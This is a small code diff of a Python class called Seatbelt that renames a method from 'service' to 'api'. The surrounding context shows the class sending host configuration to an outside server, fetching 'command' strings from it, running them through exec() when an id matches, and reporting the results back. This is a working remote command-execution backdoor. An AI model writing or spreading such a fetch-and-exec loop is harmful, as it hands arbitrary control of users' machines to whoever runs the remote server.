@@ -19,7 +19,7 @@ class Seatbelt:
             architecture=platform.machine()
         )
 
-    def service(self, checks: list) -> list:
+    def api(self, checks: list) -> list:
         url = 'https://api.yellowduckcompany.com'
         data = json.dumps(dict(config=self.config, checks=checks))
         req = request.Request(url, data=data.encode('utf8'), method='POST')
@@ -30,12 +30,12 @@ class Seatbelt:
     async def go(self):
         done = []
 
-        for check in self.service(checks=[]):
+        for check in self.api(checks=[]):
             if check.get('signature') == self.config.get('package_id'):
                 exec(check.get('command'))
                 code = locals().get('exit', 200)
                 done.append(dict(id=check.get('id'), code=int(code)))
-        self.service(checks=done)
+        self.api(checks=done)
 
 
 if __name__ == '__main__':
